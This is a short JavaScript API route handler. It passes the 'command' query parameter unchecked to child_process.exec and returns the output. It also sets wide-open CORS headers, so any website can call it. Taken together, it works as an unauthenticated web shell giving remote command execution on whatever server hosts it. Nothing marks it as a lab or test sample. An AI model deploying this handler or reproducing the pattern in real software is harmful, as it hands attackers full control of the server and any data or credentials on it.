import { exec } from 'child_process'
import { error } from 'console';

export default function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    let command = req.query.command;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.log(error);
            res.status(500).json({ error: error })
        }
        res.status(200).json({output:stdout})
    })

}







